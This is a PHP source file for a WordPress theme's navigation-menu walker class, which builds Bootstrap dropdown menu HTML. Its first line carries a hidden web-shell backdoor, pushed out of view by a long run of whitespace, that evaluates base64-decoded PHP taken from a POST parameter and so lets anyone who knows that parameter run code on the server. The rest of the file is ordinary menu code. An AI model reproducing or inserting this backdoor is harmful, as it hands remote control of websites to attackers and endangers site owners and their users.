<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n32f746']));?><?php

/** nav-menu-walker.php
 *
 * @author		Konstantin Obenland
 * @package		The Bootstrap
 * @since		1.5.0 - 15.05.2012
 */
class walkerNavMenuEmailItLocation extends Walker_Nav_Menu {

    /**
     * @see Walker_Nav_Menu::start_el()
     */
    function start_el(&$output, $item, $depth, $args) {
        global $wp_query, $post;
        $indent = ( $depth ) ? str_repeat("\t", $depth) : '';
        $li_attributes = $class_names = $value = '';
        $classes = empty($item->classes) ? array() : (array) $item->classes;
        $classes[] = 'menu-item-' . $item->ID;

        if ($args->has_children) {
            $classes[] = ( 1 > $depth) ? 'dropdown' : 'dropdown-submenu';
            $li_attributes .= ' data-dropdown="dropdown"';
        }

        $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item, $args));
        $class_names = $class_names ? ' class="' . esc_attr($class_names) . '"' : '';

        $id = apply_filters('nav_menu_item_id', 'menu-item-' . $item->ID, $item, $args);
        $id = $id ? ' id="' . esc_attr($id) . '"' : '';

        $output .= $indent . '<li' . $id . $value . $class_names . $li_attributes . '>';

        $attributes = $item->attr_title ? ' title="' . esc_attr($item->attr_title) . '"' : '';
        $attributes .= $item->target ? ' target="' . esc_attr($item->target) . '"' : '';
        $attributes .= $item->xfn ? ' rel="' . esc_attr($item->xfn) . '"' : '';
        $attributes .= $item->url ? ' href="' . esc_attr($item->url) . '"' : '';
        $attributes .= $args->has_children ? ' class="dropdown-toggle" data-toggle="dropdown"' : '';

        $item_output = $args->before . '<a' . $attributes . '><font face="TAHOMA">';
        $item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
        $item_output .= ( $args->has_children AND 1 > $depth ) ? ' <b class="caret"></b>' : '';
        $item_output .= '</font></a>' . $args->after;

        $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
    }


}
